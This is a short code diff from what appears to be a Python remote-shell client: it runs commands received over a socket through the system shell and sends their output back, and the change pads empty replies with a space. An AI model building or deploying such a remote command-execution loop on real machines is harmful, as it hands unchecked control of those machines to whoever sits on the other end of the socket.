@@ -33,7 +33,10 @@ while True:
             SOCKET.close()
             break
         try:
-            SOCKET.send(check_output(command, shell=True))
+            output = check_output(command, shell=True)
+            if output == b'':
+                output = b' '
+            SOCKET.send(output)
         except Exception as e:
             SOCKET.send(bytes(str(e), FORMAT))
 
